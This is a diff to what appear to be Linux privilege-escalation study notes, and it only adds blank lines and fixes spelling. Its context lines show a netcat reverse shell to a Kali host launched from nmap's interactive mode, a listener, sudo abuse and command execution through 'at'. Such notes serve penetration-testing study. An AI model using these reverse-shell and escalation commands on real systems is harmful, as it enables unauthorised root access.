@@ -50,6 +50,7 @@ nmap> ! nc <kali IP> 1234 -e /bin/bash
 
 ```
 - In kali machine run a netcat listener
+
 ```bash
 nc -lvp 1234    
 ```
@@ -66,6 +67,7 @@ kali-tweaks
 <img src="image-2.png" alt="alt text" width="400"/>
 <img src="image-3.png" alt="alt text" width="400"/>
 - if you are able to see the ALL in the **sudo -l** then you can run any command with sudo
+
 ````bash
 sudo -l
 ````
@@ -74,6 +76,7 @@ sudo -l
 sudo -i
 ````
 - if you see the **at**  try this
+
 ```bash
 COMMAND="id > hi.txt"
 echo "$COMMAND" | at now
@@ -87,11 +90,10 @@ or you can try bellow command
 
 echo "whoami > hi.txt" | at now
 cat hi.txt
-
 ```
-## Kernal Vulnerabilities and Application Vulnerabilities
+## Kernel Vulnerabilities and Application Vulnerabilities
 
-- To list all the packeges installed in the linux machine
+- To list all the packages installed in the linux machine
 ```bash
 apt list --installed
 dpkg --list
